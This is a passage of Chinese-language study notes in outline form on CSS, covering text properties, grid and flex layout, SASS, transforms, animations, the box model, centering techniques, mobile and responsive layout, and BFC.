<family-name> = arial | georgia | verdana | helvetica | simsun and etc.\r\n  <generic-family> = cursive | fantasy | monospace | serif | sans-serif\r\n### 文本\r\n- line-height\r\n  语法：\r\n  line-height：normal | <length> | <percentage> | <number>\r\n  normal：\r\n  允许内容顶开或溢出指定的容器边界。\r\n  <length>：\r\n  用长度值指定行高。不允许负值。\r\n  <percentage>：\r\n  用百分比指定行高，其百分比基于文本的font-size进行换算。不允许负值。\r\n  <number>：\r\n  用乘积因子指定行高。不允许负值\r\n- text-indent\r\n  语法：\r\n  text-indent：[ <length> | <percentage> ] && hanging? && each-line?\r\n- text-align\r\n  语法：\r\n  text-align：start | end | left | right | center | justify | match-parent | justify-all\r\n- text-transform\r\n  语法：\r\n  text-transform：none | capitalize | uppercase | lowercase | full-width\r\n- text-decoration\r\n  text-decoration：text-decoration-line || text-decoration-style || text-decoration-color\r\n### 变换\r\n- transform\r\n  语法：\r\n  transform：none | <transform-function>+\r\n  transform-function list:\r\n  更多信息请参考：\r\n  http://css.doyoe.com/\r\n## CSS布局\r\n### 页面布局技术细节\r\n- 浮动、定位、CSS表格、弹性盒子、网格\r\n### 布局分类\r\n- 正常流布局\r\n- 浮动float\r\n\t- 整列浮动的实现\r\n- 定位技术\r\n\t- 静态定位\r\n\t- 相对定位(Relative positioning)：允许我们相对元素在正常的文档流中的位置移动它——包括将两个元素叠放在页面上。\r\n\t\t- 这对于微调和精准设计(design pinpointing)非常有用\r\n\t- 绝对定位(Absolute positioning)：将元素完全从页面的正常布局流中移出，类似将它单独放在一个图层中. 我们可以将元素相对于页面的 <html> 元素边缘固定，或者相对于离元素最近的被定位的祖先元素(ancestor element)。\r\n\t\t- 绝对定位在创建复杂布局效果时非常有用，例如通过标签显示和隐藏的内容面板或者通过按钮控制滑动到屏幕中的信息面板.\r\n\t- 固定定位(Fixed positioning)与绝对定位非常类似，除了它是将一个元素相对浏览器视口固定，而不是相对另外一个元素。 在创建类似页面滚动总是处于页面上方的导航菜单时非常有用。\r\n- CSS表格\r\n- 弹性盒子\r\n- 网格布局Grid\r\n\t- 属性\r\n\t\t- display属性\r\n\t\t\t- grid\r\n\t\t\t- inline-grid\r\n\t\t- grid-template-columns、grid-template-row属性\r\n\t\t\t- 定义列宽、行高\r\n\t\t\t- 关键字\r\n\t\t\t\t- repeat\r\n\t\t\t\t- auto-fill\r\n\t\t\t\t- fr\r\n\t\t\t\t- minmax\r\n\t\t\t\t- auto\r\n\t\t\t\t- 设置网格线名称\r\n\t\t\t- 实例\r\n\t\t\t\t- 两栏布局\r\n\t\t\t\t\t- .wrapper{display: grid; grid-template-columns: 70% 30%}\r\n\t\t\t\t- 12栏布局\r\n\t\t\t\t\t- .wrapper{display: grid; grid-template-columns: repeat(12, 1fr)}\r\n\t\t- grid-gap\r\n\t\t\t- grid-row-gap\r\n\t\t\t- grid-column-grap\r\n\t\t- grid-template-areas属性\r\n\t\t\t- 网格允许指定区域，一个区域由一个或者多个单元格组成，属性用于定义\r\n\t\t- grid-auto-flow\r\n\t\t\t- 定义之元素放置顺序\r\n\t\t- justify-items、align-items属性、place-items属性\r\n\t\t- justify-content、aligin-content、place-content\r\n\t\t- grid-auto-column、grid-auto-rows\r\n\t\t- grid-template属性\r\n\t- item属性\r\n\t\t- grid-column-start、grid-column-end、grid-row-start、grid-row-end\r\n\t\t- grid-column属性、grid-row属性\r\n\t\t\t- grid-column\r\n\t\t\t\t- grid-column: 1/4;表示从第一根列线到第四根列线\r\n\t\t\t- grid-row\r\n\t\t- grid-area属性\r\n\t\t\t- 根据grid-area-template的定义确定item的位置\r\n\t\t\t- <row-start>/<column-start>/<row-end>/<column-end>\r\n\t\t- justyfy-self、align-self、place-self\r\n\t\t\t- 用于设置单个单元格内容的位置\r\n## SASS\r\n### 1.变量的声明和引用\r\n- $符号，变量建议使用中划线链接\r\n### 2.嵌套规则\r\n- 普通嵌套规则\r\n  // before\r\n  #content article h1 { color: #333 }\r\n  #content article p { margin-bottom: 1.4em }\r\n  #content aside { background-color: #EEE }\r\n  // after\r\n  #content {\r\n    article {\r\n      h1 { color: #333 }\r\n      p { margin-bottom: 1.4em }\r\n    }\r\n    aside { background-color: #EEE }\r\n  }\r\n- 父选择器标识符&\r\n- 群组选择器的嵌套\r\n- 子组合选择器和同层组合选择器： >、 +和~\r\n- 嵌套属性\r\n  nav {\r\n    border: {\r\n    style: solid;\r\n    width: 1px;\r\n    color: #ccc;\r\n    }\r\n  }\r\n### 3.导入sass文件\r\n- 导入方法： @import\r\n- 怎样使用sass部分文件\r\n\t- 使用下划线开头的“局部文件”\r\n- 默认变量值\r\n\t- ！default\r\n\t  你希望导入sass库文件的人，可以定制修改sass库文件中的某些字。使用sass的!default标签可以实现。\r\n\t  !default: 若这个变量被声明赋值了，就是声明值，否则则使用默认值\r\n- 嵌套导入\r\n\t- @import命令写在css规则内\r\n\t\t- .blue-theme {@import "blue-theme"}\r\n- 原生css导入\r\n\t- sass兼容css语法，改.css文件名为.scss\r\n### 4.静默注释\r\n- 静默格式/* ....*/，其内容不会出现在生成的css文件中\r\n### 5.混入器\r\n- 如何声明：@mixin; 引用： @include\r\n- mixin可以包含css规则\r\n- mixin传参\r\n\t- @mixin link-colors($normal, $hover, $visited) {\r\n  color: $normal;\r\n  &:hover { color: $hover; }\r\n  &:visited { color: $visited; }\r\n}\r\n\t- 设置默认参数：@mixin link-colors(\r\n    $normal,\r\n    $hover: $normal,\r\n    $visited: $normal\r\n  )\r\n{\r\n  color: $normal;\r\n  &:hover { color: $hover; }\r\n  &:visited { color: $visited; }\r\n}\r\n### 6.继承\r\n- @extend继承\r\n## CSS3\r\n###  opicity 和 rgba的区别\r\n- opacity只能设定整个元素的透明值，而alpha通道可以特定对元素的某个属性设定透明值，比如上面的背景、边框、文字等\r\n### transform变形\r\n- transform: rotate(angle); 旋转\r\n\t- 如：transform: rotate(9deg)\r\n- transform: translate(length); 平移\r\n\t- transform: translate(100px,50px); 水平垂直同时移动\r\n\t- transform: translateX(100px); 水平移动\r\n\t- transform: translateY(50px); 垂直移动\r\n- transform: scale(number); 缩放\r\n\t- transform: scale(2,1.5); 水平垂直同时缩放\r\n\t- transform: scaleX(2); 水平缩放\r\n\t- transform: scaleY(2); 垂直缩放\r\n- transform: skew(angle); 扭曲\r\n\t- transform: skew(30deg,10deg); 水平垂直同时扭曲\r\n\t- transform: skewX(30deg); 水平扭曲\r\n\t- transform: skewY(30deg); 垂直扭曲\r\n- transform: matrix(<number>,<number>,<number>,<number>,<number>,<number>); 矩阵\r\n- transform-origin(X,Y): length; 改变元素变换基点\r\n### rem单位\r\n- font size of the root element\r\n\t- px、em、rem的区别\r\n\t\t- px，像素，相对长度单位，相对于屏幕分辨率\r\n\t\t- em，相对长度单位，相对父节点的字体尺寸，如未设置则相对于浏览器默认字体尺寸\r\n\t\t\t- 一般浏览器默认值为16px\r\n\t\t- rem仍然是相对长度单位，但只相对于HTML根元素\r\n\t- 通过修改根元素就可以成比例地调整所有字体尺寸\r\n\t- 设置 html{ font-size: 10px; } 则1rem=10px\r\n### fixed布局\r\n- 任何一个容器都可以指定为Flex布局 display: flex;\r\n- 行内元素也可以指定为Flex布局 display: inline-flex;\r\n- 设置为flex布局后子元素的float、clear、vertical-align属性将失效\r\n- 采用flex布局的元素称为flex container，简称容器，它的所有子元素自动成为容器成员，称为flex item，简称项目\r\n\t- 容器默认存在两根轴\r\n\t\t- 水平的主轴（main axis），开始位置为main start，结束位置为main end\r\n\t\t- 垂直的主轴（cross axis），开始位置为cross start，结束位置为cross end\r\n\t\t- 项目默认按主轴排列\r\n\t\t- 单个项目占据的主轴空间叫做main size，占据的交叉轴空间叫做cross size\r\n\t- 可以在容器上设置6种属性\r\n\t\t- flex-direction\r\n\t\t\t- flex-direction决定主轴的方向（即项目的排列方向）\r\n\t\t\t\t- flex-direction: row; 默认值，主轴水平方向，以左端为起点\r\n\t\t\t\t- flex-direction: row-reverse;  主轴水平方向，以右端为起点\r\n\t\t\t\t- flex-direction: column; 主轴垂直方向，以左端为起点\r\n\t\t\t\t- flex-direction: column-reverse; 主轴垂直方向，以右端为起点\r\n\t\t- flex-wrap\r\n\t\t\t- flex-wrap定义如何换行\r\n\t\t\t\t- flex-wrap: nowrap; 默认值，不许换行\r\n\t\t\t\t- flex-wrap: wrap; 换行，第一排在上方\r\n\t\t\t\t- flex-wrap: wrap-reverse; 换行，第一排在下方\r\n\t\t- flex-flow\r\n\t\t\t- flex-direction和flex-wrap的缩写\r\n\t\t\t\t- flex-flow:<flex-direction> <flex-wrap>; 如flex-flow: row-reverse nowrap; \r\n\t\t- justify-content\r\n\t\t\t- justify-content定义在主轴上的对齐方式\r\n\t\t\t\t- justify-content: flex-start; 默认值，左对齐\r\n\t\t\t\t- justify-content: flex-end; 右对齐\r\n\t\t\t\t- justify-content: center; 居中\r\n\t\t\t\t- justify-content: space-between; 两端对齐\r\n\t\t\t\t- justify-content: space-around; 项目之间间隔相等\r\n\t\t- align-items\r\n\t\t\t- align-items定义在交叉轴上的对齐方式\r\n\t\t\t\t- align-items: flex-start; 交叉轴起点对齐\r\n\t\t\t\t- align-items: flex-end; 交叉轴终点对齐\r\n\t\t\t\t- align-items: center; 交叉轴中点对齐\r\n\t\t\t\t- align-items: baseline; 第一行文字的基线对齐\r\n\t\t\t\t- align-items: stretch; 默认值，若项目未设置高度或为auto，将占满整个容器高度\r\n\t\t- align-content\r\n\t\t\t- align-content定义多根轴的对齐方式\r\n\t\t\t\t- flex-start、flex-end、center、space-between、space-around、stretch（默认值）\r\n\t- 可以在项目上设置6种属性\r\n\t\t- order\r\n\t\t\t- order定义项目的排列顺序\r\n\t\t\t\t- order: <integer>; 数值越小排列越靠前，默认值0\r\n\t\t- flex-grow\r\n\t\t\t- flex-grow定义项目的放大比例\r\n\t\t\t\t- flex-grow: <number>; 默认为0\r\n\t\t- flex-shrink\r\n\t\t\t- flex-shrink定义项目的缩小比例\r\n\t\t\t\t- flex-shrink: <number>; 默认为1，负值无效\r\n\t\t- flex-basis\r\n\t\t\t- flex-basis定义在分配空余空间之前项目占据的主轴空间\r\n\t\t\t\t- flex-basis: <length>; ，默认值为auto\r\n\t\t- flex\r\n\t\t\t- flex-grow、flex-shrink和flex-basis的缩写\r\n\t\t\t\t- flex: <flex-grow> <flex-shrink> <flex-basis>; 建议优先使用这个属性\r\n\t\t- align-self\r\n\t\t\t- align-self允许单个项目拥有与其他项目不同的对齐方式，可覆盖align-items\r\n\t\t\t\t- 可取6个值，除了默认值auto都与align-items相同\r\n### animate动画\r\n- animate是一个简写属性，用于设置6大动画属性\r\n\t- animate-name 规定@keyframes动画名称\r\n\t\t- animate-name: keyframename; 动画名称\r\n\t\t- animate-name: none; 无动画效果，可用于覆盖来自级联的动画\r\n\t- animate-duration: time; 一个动画周期持续的时间，默认值为0\r\n\t- animation-timing-function 速度曲线\r\n\t\t- ease，默认值，以低速开始加速，结束前变慢\r\n\t\t- ease-in，以低速开始\r\n\t\t- ease-out，以低速结束\r\n\t\t- ease-in-out，以低速开始结束\r\n\t\t- linear，整个过程速度不变\r\n\t\t- cubic-bezier(n,n,n)，以cubic bezier函数来生成一个速度函数，可能的值是1到0\r\n\t- animation-delay:time; 何时开始，允许负值\r\n\t- animation-iteration-count播放次数\r\n\t\t- n，播放次数，默认值1\r\n\t\t- infinite，无限次播放\r\n\t- animation-direction规定动画在下一周期是否逆向播放\r\n\t\t- normal，默认值，正常播放\r\n\t\t- alternate，轮流反向播放\r\n- animation-play-state规定动画正在运行还是暂停\r\n\t- paused，已暂停\r\n\t- running，正在播放\r\n- @keyframes规则创建动画\r\n\t- @keyframes keyframename{ keyframes-selector{css-styles;}} \r\n\t\t- 如：@keyframes myfirstmove{ 0%{ top:0px; background:red; } 100%{ top:100px; background:yellow; }}\r\n- animation-fill-mode规定动画在播放之前或之后，其动画效果是否可见\r\n\t- none，不改变默认行为\r\n\t- forwards当动画完成后，保持最后一个属性值（在最后一个关键帧中定义）\r\n\t- backwards在 animation-delay 所指定的一段时间内，在动画显示之前，应用开始属性值（在第一个关键帧中定义）\r\n### transition过渡\r\n- transition是一个简写属性，用于设置4个过渡属性\r\n\t- transition-property: width; 用于设置产生变形的CSS属性\r\n\t- transition-duration: time; 用于设置过渡时间，是必须设置的，否则不会产生过渡效果\r\n\t- transition-timing-function类似于animate-timing-function\r\n\t- transition-delay: time; 效果开始前需要等待的时间\r\n### media queries\r\n- 工作方式\r\n\t- 直接在link中判断设备尺寸然后引用不同的css文件\r\n\t- link rel="stylesheet" type="text/css" href="#" media="screen and (min-width:400px ) and (max-width:600px)"\r\n\t- 直接写在style标签里\r\n\t- @media screen and (max-width:600px){ } \r\n- media属性中\r\n\t- 十种media type：all、screen、print、tv、handheld等\r\n\t- 关键字：and、only（限定某种媒体）、not（排除某种媒体）\r\n\t- 媒体特性，放在一对（）中，如(min-width:600px)\r\n## 盒模型\r\n### 标准盒模型\r\n- 元素的width、height只包含内容content，不包含border和padding的值；\r\n- 盒子的大小由元素的宽高、边框和内边距决定\r\n### 转换\r\n- box-sizing\r\n\t- content-box\r\n\t- border-box\r\n\t\t- 若想控制元素总宽高保持固定，这个设置很有用。\r\n### IE盒模型\r\n- 元素的width、height不仅包括content，还包括border和padding\r\n- 盒子的大小取决width、height，修改border和padding值不能改变盒子的大小\r\n### 注意\r\n- 元素的宽（width）、高（height）、边框（border）、内边距（padding）、外边距（margin）都是盒子模型的重要组成部分，但是盒子模型的大小只与元素的宽高、边框、内间距有关，外边距只影响盒子所占外围空间的大小。\r\n## 雪碧图优缺点\r\n### 减少图片请求次数\r\n### 提高页面加载速度\r\n- 合成的图片相比不合成图片大小综合要小\r\n### 影响浏览器缩放功能\r\n- 相邻图片会被露出来\r\n- 大图片会有性能下降问题\r\n### css编写困难\r\n### 拼图维护麻烦\r\n### css图片不能被打印\r\n- 除非在@media添加print声明\r\n### 最大问题就是内存的使用\r\n- 图片留有无用的空白\r\n## 元素居中方法汇总\r\n### 水平居中\r\n- 文本、图片\r\n\t- 容器中设置：text-align:center\r\n- 块级元素\r\n\t- ( 如果宽度固定)margin: auto法------margin: 0 auto （对浮动及绝对定位元素无效,另：这里的0 其实可以是任意值）\r\n\t- （如果宽度不固定）新增包裹元素法----设置包裹元素为浮动float:left;position:relative;left:50%,再设置其自身position:relative;left:-50% 或right:50%即可（该50%其实是相对包裹元素的宽度而并非其自身的宽度！另外该方法不适合垂直居中！！！除非高度固定才可以。）\r\n\t- 父元素相对定位，子元素绝对定位法（详见《垂直居中》中的块级元素部分）\r\n\t- （对于多个块级元素） inline-block法 ：其父元素设置text-align:center,其自身设置display:inline-block，使用inline-block注意清除由其带来的空隙及使用 vertical-align属性！\r\n### 垂直居中（或水平垂直居中）\r\n- 单行文本\r\n\t- （如果父元素高度固定）line-height法------父元素的height与父元素的line-height相等\r\n\t- （如果父元素高度不固定）上下padding法------父元素的上下padding相等\r\n- 多行文本\r\n\t- （如果父元素高度固定）vertical-align法------父元素设置display:table-cell;vertical-align:middle\r\n\t- （如果父元素高度不固定）上下padding法------父元素的上下padding相等\r\n- 块级元素\r\n\t- 如果尺寸固定\r\n\t\t- 负margin法------父元素设置position为relative，子元素position为absolute，top,left为：50%，margin-left,margin-top各为其自身宽或高的一半的负数。\r\n\t\t- calc法------同上，父元素设置position为relative，子元素position为absolute，top,left为：50%，采用calc（50%-其自身宽或高的一半）\r\n\t\t- transform法------同上，父元素设置position为relative，子元素position为absolute，top,left为：50%，并使用 transform: translate(-50%, -50%);\r\n\t\t- 4个0法------ 还是父元素设置position为relative，子元素position为absolute，其它见上面的代码\r\n\t- 如果尺寸不固定\r\n\t\t- transform法------父元素设置position为relative，子元素position为absolute，top,left为：50%，并使用 transform: translate(-50%, -50%);\r\n\t\t- display:table-cell法------ 父元素 display:table-cell; vertical-align:middle\r\n\t\t- flex法------父元素align-items:center;justify-content:center\r\n\t\t- 伪类法------在父元素中增加一个高度为100%的空元素，其他详见代码\r\n- 图片\r\n\t- display:table-cell法------display:table-cell;             vertical-align:middle\r\n\t- 伪类法------在父元素中增加一个高度为100%的空元素，其他详见代码\r\n\t- js处理设置上下边距相等\r\n## 网格布局\r\n### CSS网格属性总结\r\n- 网格容器（父元素）\r\n\t- display\r\n\t\t- grid\r\n\t\t- inline-grid\r\n\t\t- subgrid（行列大小会继承父级网格容器）\r\n\t- grid-template-columns、grid-template-rows\r\n\t\t- 网格线名称\r\n\t\t- 长度值、百分比或者fr\r\n\t- grid-template-areas\r\n\t\t- grid-area-name\r\n\t\t- . （点号） 代表一个空的网格单位\r\n\t\t- none 不定义网格区域\r\n\t- grid-template\r\n\t\t- none：将三个属性设为初始值\r\n\t\t- subgrid：将grid-template-columns及grid-template-rows的值设为subgrid，将grid-template-areas设为初始值\r\n\t\t- <grid-template-rows> / <grid-template-columns>将grid-template-rows和grid-template-columns设置为相应的值，并将grid-template-areas设为none\r\n\t- grid-column-gap/grid-row-gap\r\n\t\t- 长度值\r\n\t- grid-gap\r\n\t\t- <grid-row-gap> <grid-column-gap>长度值\r\n\t- justify-items（注意与justify-content的区别）\r\n\t\t- start\r\n\t\t- end\r\n\t\t- center\r\n\t\t- stretch\r\n\t- align-items\r\n\t\t- start\r\n\t\t- end\r\n\t\t- center\r\n\t\t- stretch\r\n\t- justify-content( 注意与flex中的justify-content区别，这里不是表示里面的内容 )\r\n\t\t- start\r\n\t\t- end\r\n\t\t- center\r\n\t\t- stretch\r\n\t\t- space-between\r\n\t\t- space-around\r\n\t\t- space-evenly\r\n\t- align-content\r\n\t\t- start\r\n\t\t- end\r\n\t\t- center\r\n\t\t- stretch\r\n\t\t- space-between\r\n\t\t- space-around\r\n\t\t- space-evenly\r\n\t- grid-auto-columns / grid-auto-rows\r\n\t\t- 长度值/百分比/fr\r\n\t- grid-auto-flow\r\n\t\t- row\r\n\t\t- column\r\n\t\t- row dense\r\n\t\t- column dense\r\n\t- grid\r\n\t\t- none\r\n\t\t\t- 将所有子属性设置为其初始值\r\n\t\t- <grid-template-rows> / <grid-template-columns>\r\n\t\t\t- 将grid-template-rows 和 grid-template-columns分别设置为指定值，将其他子属性设置为其初始值\r\n\t\t\t\t- 例子（上下两个是等效的）\r\n\t\t- <grid-auto-flow> [<grid-auto-rows> [ / <grid-auto-columns>] ] \r\n\t\t\t- 如果省略了grid-auto-columns，则它被设置为由grid-auto-rows指定的值。如果两个都被省略，他们会被设置为初始值\r\n\t\t\t\t- 例子（上下两个是等效的）\r\n\t\t-  <grid-template-areas> <grid-template-rows> / <grid-template-columns>\r\n\t\t\t- 一次性设置所有值，设置后其他属性均为默认值\r\n\t\t\t\t- 例子\r\n- 网格项（子元素）\r\n\t- grid-column-start / grid-column-end / grid-row-start / grid-row-end\r\n\t\t- 网格线名称\r\n\t\t- span <number> 该网格项将跨越所提供的网格轨道数量\r\n\t\t- span <name> 该网格项将跨越到它所提供的名称位置\r\n\t\t- auto：表示自动放置，自动跨度，默认会扩展一个网格轨道的宽度或高度\r\n\t- grid-column / grid-row\r\n\t\t- <start-line> / <end-line>\r\n\t\t\t- 含义\r\n\t\t\t\t- grid-column-start + grid-column-end 和 grid-row-start + grid-row-end的简写\r\n\t\t\t- 语法示范\r\n\t\t\t\t- 示范\r\n\t\t\t- 举例\r\n\t\t\t\t- 例子\r\n\t- grid-area\r\n\t\t- <name> ：自定义的名称，以便被grid-template-areas属性创建的模版所引用\r\n\t\t- <row-start> / <column-start> / <row-end> / <column-end>：数字或网格线名称（其实这里还有 比如  grid-row-start:1 ; grid-column-start:2等价的表达 ）\r\n\t- justify-self\r\n\t\t- start\r\n\t\t- end\r\n\t\t- center\r\n\t\t- stretch（默认值）\r\n\t- align-self\r\n\t\t- start\r\n\t\t- end\r\n\t\t- center\r\n\t\t- stretch（默认值）\r\n### CSS网格布局基本概念（mdn版）\r\n- 网格容器\r\n\t- （父元素）使用 display:grid 或者display:inline-grid\r\n- 网格轨道\r\n\t- （父元素）使用 grid-template-columns 和grid-template-rows属性来定义列和行\r\n\t- 单位：px或者百分比或者fr 如：grid-template-rows:1fr 1fr 1fr\r\n\t- 在轨道清单中使用repeat()来标记重复部分或者整个轨道列表\r\n\t\t- grid-template-rows:1fr 1fr 1fr 可以改写为grid-template-rows: repeat( 3, 1fr )\r\n\t\t- grid-template-rows: 20px 1fr 1fr 20px 可以改写为grid-template-rows:  20px  repeat( 2, 1fr ) 20px\r\n\t\t- 传入轨道列表 ：grid-template-rows: 1fr 2fr  1fr 2fr 1fr 2fr  可以改写为grid-template-rows:  repeat( 3, 1fr 2fr ) \r\n\t- （父元素）隐式和显式网格\r\n\t\t- grid-auto-rows （行  其实它控制的是元素的高度 --别搞混淆了）\r\n\t\t- grid-auto-columns （列 其实它控制的是元素的宽度--别搞混淆了）\r\n\t- 轨道大小和minmax()\r\n\t\t- grid-auto-rows :minmax(100px, auto) （其表示最小高度是100px，最大高度自适应）\r\n- 网格线\r\n\t- （子元素）跨轨道放置网格项目\r\n\t\t- grid-column-start , grid-column-end , grid-row-start ,grid-row-end\r\n\t\t- 比如  列线1-列线4，行线1至行线2  我们可以写成： grid-column-start:1 ; grid-column-end:4 ; grid-row-start:1 ;grid-row-end:2; 或者直接简写成 grid-column: 1/4 ;grid-row:1/2;\r\n- 网格单元\r\n\t- 最小单位\r\n- 网格区域\r\n\t-   （父元素） grid-template-areas\r\n\t- （子元素）grid-areas\r\n- 网格间距\r\n\t- （父元素）grid-column-gap、grid-row-gap 或者合并简写：grid-gap\r\n- 嵌套网格\r\n- 使用z-index控制层级\r\n\t- 原本覆盖的顺序遵循文档流的原始顺序原则即： 后来者居上的原则\r\n## Css2D-3D\r\n### 1.过渡效果transition\r\n- 说明：过渡是从一种状态到另外一种状态, 过渡需要触发条件, 通常过渡都是写在开始状态\r\n- transition-property\r\n\t- 规定哪些属性需要过渡\r\nall 默认值 全部属性过渡，多个属性过渡,用逗号隔开\r\n- transition-duration\r\n\t- 过渡的时间 默认值 0s\r\n- transition-timing-function\r\n\t- 过渡的运动曲线\r\nease 默认值 逐渐慢下来\r\nlinear  均速\r\n- transition-delay\r\n\t- 过渡的延迟\r\n- 连写：transition: all 1s linear 0s\r\n### 2.2D转换\r\n- 1.位移 transform：translate(-50%,-50%)\r\n\t- 优点：对自盒子不用计算向上和向左移动多少\r\n\t- 特点：若仅仅只是识位移，盒子不会脱标，盒子原有的位置还在标准流中\r\n- 2.旋转 transform：rotate(45deg)\r\n\t- 正=>顺时针\r\n\t- 负=>逆时针\r\n- 3.旋转点 transform-origin：水平 垂直\r\n\t- 可以设置方位名称，也可以设置具体数值\r\n- 3.缩放/扩大 transform：scale（number，number）\r\n\t- 1.大于0小于1=>缩放\r\n\t- 2.大于1=>扩大\r\n### 3.动画\r\n- 1.定义动画 @keyframs 名称 {\r\n\t0%{\r\n    }，\r\n\t100%{\r\n    }\r\n}\r\n- 2.指定动画名称 animation-name\r\n- 3.完成一个周期所需要的时间 animation-duration\r\n- 4.动画的运动曲线 linear匀速 ease缓冲 steps步长  animation-timing-function: linear\r\n- 5.次数 infinite无线循环 animation-iteration-count:infinite\r\n- 6.是否你想播放，如果想逆向播放的前提是 次数需要大于2次  animation-direction:alternate\r\n- 7.结束之后的状态 在哪里 animation-fill-mode: forwards\r\n- 8.延迟几秒开始 animation-delay: 3s\r\n- 9.暂停 animation-play-state: paused\r\n### 4.3D转换\r\n- 1.位移：transform：translate(x,y,z)\r\n\t- 1.x轴 正值向右，负值向左\r\n\t- 2.y轴 正值向下，负值向上\r\n\t- 3.z轴 正值向前，负值向后 \r\n\t- 注意：如果要设置多个轴时，不要分开设置，要写在同一个transform中\r\n- 2.旋转\r\n\t- transform：- transform: rotateX(角度); \r\n    - transform: rotateY(角度); \r\n    - transform: rotateZ(角度); \r\n- 注意：\r\n\t- 1.视距越大，物体越小，*视距越小，物体越大\r\n\t- 2.translateZ值越大，物体越大，translateZ越小，物体越小\r\n\t- 3.translateZ一定要与perspective 一起使用，近大远小\r\n\t- 4.左手法则\r\n\t\t- 1.X正值=>右\r\n\t\t- 2.Y正值=>下\r\n## 移动端\r\n### 移动端（流式）布局\r\n- 1.移动端相关知识\r\n\t- 1.什么是物理像素\r\n\t\t- 答：屏幕分辨率\r\n\t- 2.什么是开发像素\r\n\t\t- 答：css像素px 就是开发像素\r\n\t- 3.开发像素在PC端和屏幕分辨率比例是一致吗？\r\n\t\t- 答：一致\r\n\t- 4.开发像素在移动端和屏幕分辨率比例一致吗？\r\n\t\t- 答：不一定一致，因为物理像素比可能不一样\r\n\t- 5.什么是物理像素比？\r\n\t\t- 答：1个物理像素=多个开发像素\r\n\t- 6，物理像素比的影响\r\n\t\t- 答：未来图片在移动端，因为物理像素比的存在，图片可能会放大而失真，影响用户体验，所以设计素材人员，在设计图片时，以多倍的方式设置\r\n- 2.盒子模型 box-sizing\r\n\t- 1.传统盒子（content-box）\r\n\t\t- 盒子大小：内容+padding+border\r\n\t\t\t- 缺点：盒子要是保持原来的大小，需要自己计算width 和 height\r\n\t- 2.CSS3盒子（border-box）\r\n\t\t- 盒子大小：内容（内容+padding+border）\r\n\t\t\t- 优点：盒子的内容会自动适应模型的变化\r\n- 3.扩展（H5新增标签）\r\n\t- 1.header 头部标签\r\n\t- 2.footer 底部标签\r\n\t- 3.section 区块标签\r\n\t- 4.article 文本内容标签\r\n\t- 5.aside 侧边标签\r\n\t- 6.nav 导航标签\r\n\t- 注意：以上标签均可用div代替，但是div没有语义\r\n- 4.京东移动端案例：（注意事项）\r\n\t- 1.视口配置-理想视口（记得要写，写在字符编码下方即可）\r\n\t\t-  <meta name="viewport" content="width=device-width, user-scalable=no,initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">\r\n\t- 2.初始化样式\r\n\t\t- normalize.css\r\n### 移动端flex（弹性）布局\r\n- 1.设置主轴方向（flex-direction）\r\n\t- 1.row水平\r\n\t- 2.column垂直\r\n\t- 3.row-reverse 反向/column-reverse 反向\r\n- 2.设置主轴上子元素的排列方式（justify-content）\r\n\t- 1.flex-start 从头开始\r\n\t- 2.flex-end 从尾部开始\r\n\t- 3.center 居中\r\n\t- 4.space-around 平分间距\r\n\t- 5.space-between 两端对齐中间自动填充\r\n- 3.设置子元素是否换行（flex-wrap）\r\n\t- 1.nowrap 不换行（默认）\r\n\t- 2.wrap 换行\r\n- 4.设置侧轴上的子元素排列方式（单行 ）（aligin-items）\r\n\t- 1.flex-start 从上到下\r\n\t- 2.flex-end 从下到上\r\n\t- 3.center 居中\r\n\t- 4.stretch 拉伸（不能设置高度）\r\n- 5.设置侧轴上的子元素的排列方式（多行）（align-content）\r\n\t- 1.flex-start （默认值在侧轴的头部开始）\r\n\t- 2.flex -end （在侧轴的尾部开始排列）\r\n\t- 3.center （在侧轴中间显示）\r\n\t- 4.space-around （子项在侧轴平分剩余部分）\r\n\t- 5.space-between 子项在侧轴先分布在两头，在平分剩余空间\r\n\t- 6.stretch 设置子项元素高度平分父元素高度\r\n- 6.flex属性 \r\n\t- 1.flex 属性定义子项目==分配容器的剩余空间==，用flex来表示占多少==份数==。\r\n\t- 2.align-self 控制子项自己在侧轴上的排列方式\r\n\t- 3.order 属性定义项目的排列顺序/数值越小，排列越靠前，默认为0。\r\n### 移动端（rem布局）\r\n- 1.单位\r\n\t- 1.em\r\n\t\t- 基于父亲的字体的大小\r\n\t- 2.rem\r\n\t\t- 基于Html 字体的大小（绝对唯一控制）\r\n- 2.媒体查询\r\n\t- 作用：查询屏幕，相应屏幕变化\r\n\t- 档位划分 例：@media screen and （min-width）\r\n\t- 等比：在各个挡位下，比例一直不变，变化的是rem后面的值\r\n- 3.less\r\n\t- 是一种css的扩展语言，辅助css计算使用\r\n- 4.flexible.js\r\n\t- 引入此js 可以实现等比变化，不会一抽一抽的\r\n### 响应式布局（PC，手机，pad）\r\n- 1.档位划分\r\n\t- w<768  超小屏幕（xs : extra small）\r\n\t- 768<= w <992  小屏设备\r\n\t- 992<= w <1200  中等屏幕\r\n\t- 1200<=w  大宽屏设备（lg: large）\r\n- 2.bootstrap\r\n\t- 1.栅格系统\r\n\t\t- 1.在各个档位下，控制子元素布局不同；将版心宽度均分为  12份\r\n\t- 2.特点\r\n\t\t- 1.盒子有左右15padding\r\n\t\t- 2.盒子 col-lg：有左右15padding\r\n\t\t- 3.去除15padding：加div.row （左右负 -15px margin 值）\r\n\t- 3.作用：左右偏移，居中\r\n- 3.备注\r\n\t- 1.向下：涉及向下布局，需要手动写媒体查询\r\n\t- 2.只要涉及隐藏，就要用到响应式工具  \r\n\t\t- 例如：hidden-xs 只是xs时隐藏\r\n\t\t- 例如：visible-xs  知识xs时显示\r\n## BFC\r\n### 触发BFC（一个新的BFC可以通过给容器添加任何一个触发BFC的CSS样式来创建）\r\n- float的值不为none\r\n- position的值不为static或者relative\r\n\t- 关于position定位\r\n\t\t- static定位\r\n\t\t\t- 　static定位是HTML元素的默认值，即没有定位，元素出现在正常的流中\r\n\t\t- fixed固定定位\r\n\t\t\t- fixed定位是指元素的位置相对于浏览器窗口是固定位置，即使窗口是滚动的它也不会滚动，且fixed定位使元素的位置与文档流无关，因此不占据空间，且它会和其他元素发生重叠。\r\n\t\t\t- 兼容性\r\n\t\t- relative相对定位\r\n\t\t\t- 相对定位元素的定位是相对它自己的正常位置的定位。\r\n\t\t\t- 即使相对元素的内容移动了，但是预留空间的元素仍然保存在正常流动\r\n\t\t- absolute绝对定位\r\n\t\t\t- 绝对定位的元素相对于最近的已定位父元素，如果元素没有已定位的父元素，那么它的位置相对于<html>。\r\n\t\t- sticky粘性定位\r\n\t\t\t- 